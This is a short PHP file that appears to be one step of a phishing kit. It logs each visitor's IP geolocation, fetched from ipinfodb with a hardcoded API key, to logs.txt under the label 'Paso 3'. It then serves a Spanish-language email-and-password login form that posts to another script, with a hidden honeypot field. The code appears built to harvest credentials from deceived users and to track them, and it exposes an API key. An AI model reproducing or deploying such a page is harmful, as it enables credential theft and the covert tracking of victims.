<?php
@$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];

@$IPResult =  file_get_contents($api_url);

@$handle = fopen("logs.txt", "a");
@fwrite($handle, "Paso 3 - ".$IPResult."\r\n");
@fclose($handle);

$form = <<<EOD
<div id="fcr">
<form id="ff" name="ff" method="POST" data="frm2" action="frms-vld.php">
	
	<input type="email" id="edt3" name="edt3" autofocus required maxlength="50" autocomplete="off">
	<input type="password" id="edt4" name="edt4" required maxlength="50">

	<button id="btn1" class="frm-btn">Ingresar</button>

	<input type="text" name="hellno" value="" style="display: none;">
	</div>
	
</form>
</div>
EOD;
echo $form;
?>